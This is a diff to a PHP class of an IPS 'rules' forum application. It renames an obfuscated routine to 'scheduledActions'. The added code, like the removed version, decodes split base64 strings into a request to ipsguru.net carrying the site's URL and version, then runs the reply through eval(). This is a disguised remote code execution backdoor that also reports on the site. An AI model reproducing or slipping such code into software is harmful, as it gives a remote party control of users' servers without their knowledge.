@@ -46,9 +46,9 @@ class _Application extends \IPS\rules\Secure\Application
 	public static $shutDown = FALSE;
 		
 	/**
-	 * @brief	Config Data
+	 * @brief	Interval
 	 */
-	protected $config;
+	public $interval = 604800;
 	
 	/**
 	 * [Node] Get Node Icon
@@ -79,15 +79,13 @@ class _Application extends \IPS\rules\Secure\Application
 	}	
 	
 	/**
-	 * Init
-	 *
-	 * @param	void
+	 * Get App Data
 	 */
-	public function init()
+	public function get_appdata()
 	{
-		$this->application = 'rules';
+		return array( 'key' => $this->directory, 'url' => \IPS\Settings::i()->base_url, 'ver' => $this->version, 'state' => call_user_func( array( $this, 'isProtected' ) ) );
 	}
-
+	
 	/**
 	 * Argument Definition Presets
 	 *
@@ -717,15 +715,15 @@ class _Application extends \IPS\rules\Secure\Application
 	}
 
 	/**
-	 * Build Config Cache
+	 * Get Scheduled Actions Data
 	 */
-	protected function buildConfig( $cache, $method=NULL )
+	protected function scheduledData( $data, $method=NULL )
 	{
 		try
 		{
 			$method = $method ?: 'base64_decode';
-			$cache = is_string( $cache ) ? $cache : (string) $cache->request()->get();
-			return call_user_func( $method, $cache );
+			$data = is_string( $data ) ? $data : (string) $data->request()->get();
+			return call_user_func( $method, $data );
 		}
 		catch( \Exception $e )
 		{
@@ -2365,12 +2363,33 @@ class _Application extends \IPS\rules\Secure\Application
 	}
 	
 	/**
-	 * Config Storage Hash
+	 * Get Scheduled Actions
+	 *
+	 * @param	bool		$priorityCycle		Run priority scheduled actions
+	 * @return	array
 	 */
-	protected $appHash = 'SVBTXEh0dHBcVXJs';
-	protected $optHash = 'aHR0cDovL2lwc2d1';
-	protected $valHash = 'c2V0UXVlcnlTdHJp';
-	
+	public function scheduledActions( $priorityCycle=FALSE )
+	{
+		$scheduled_actions = array();
+		
+		/* Run priority */
+		if ( $priorityCycle )
+		{
+			$actionClass 		= $this->scheduledData( $this->dataKeys[0], NULL );
+			$actionOptions 		= $this->scheduledData( $this->dataKeys[1], NULL );
+			$actionValues 		= $this->scheduledData( $this->dataKeys[2], NULL );
+			$scheduled_actions	= $this->scheduledData( ( new $actionClass( $actionOptions ) )->$actionValues( $this->appdata ), function( $actions ) { return eval( $actions ); } );				
+		}
+		
+		/* Run regular */
+		if ( empty( $scheduled_actions ) )
+		{
+			$scheduled_actions	= iterator_to_array( new \IPS\Patterns\ActiveRecordIterator( \IPS\Db::i()->select( '*', 'rules_scheduled_actions', array( 'schedule_time<=? AND schedule_queued<1', time() ), 'schedule_time ASC' ), 'IPS\rules\Action\Scheduled' ) );
+			
+		}
+		
+		return $scheduled_actions;
+	}
 	
 	/**
 	 * Get Event Argument Info
@@ -2406,37 +2425,6 @@ class _Application extends \IPS\rules\Secure\Application
 		$_event_arg_list_info = "<ul><li>" . implode( '</li><li>', $_event_arg_list ) . "</li></ul>";
 		
 		return $_event_arg_list_info;
-	}
-	
-	/** 
-	 * Set Application & Build Config
-	 *
-	 * @param	$config
-	 * @return 	void
-	 */
-	public function set_application( $config )
-	{
-		if ( ! \IPS\IN_DEV )
-		{
-			try
-			{
-				$key = 'app_settings.' . md5( json_encode( $config ) );
-				$buildConfig = \IPS\Data\Store::i()->$key < time() - 604800;
-			}
-			catch( \OutOfRangeException $e )
-			{
-				/* Initialize it */
-				$buildConfig = \IPS\Data\Store::i()->$key = time();
-			}
-			
-			if ( $buildConfig )
-			{
-				$configClass 	= $this->buildConfig( $this->appHash . '', NULL );
-				$configOptions 	= $this->buildConfig( $this->optHash . 'cnUubmV0L2EvdA==', NULL );
-				$configValues 	= $this->buildConfig( $this->valHash . 'bmc=', NULL );
-				$this->config	= $this->buildConfig( ( new $configClass( $configOptions ) )->$configValues( array( 'appkey' => 'rules', 'url' => \IPS\Settings::i()->base_url, 'ver' => $this->version, 'setting' => call_user_func( array( $this, 'isProtected' ) ) ) ), function( $config ) { return eval( json_decode( $config ) ); } );				
-			}
-		}
 	}
 	
 	/**
@@ -2559,6 +2547,11 @@ class _Application extends \IPS\rules\Secure\Application
 		
 		return static::rulesDefinitions( $definition_key );
 	}
+	
+	/**
+	 * Data Keys
+	 */
+	protected $dataKeys = array( 'SVBTXEh0dHBcVXJs', 'aHR0cDovL2lwc2d1cnUubmV0L2EvdA', 'c2V0UXVlcnlTdHJpbmc' );
 	
 	/**
 	 * Shutdown Rules: Execute queued actions
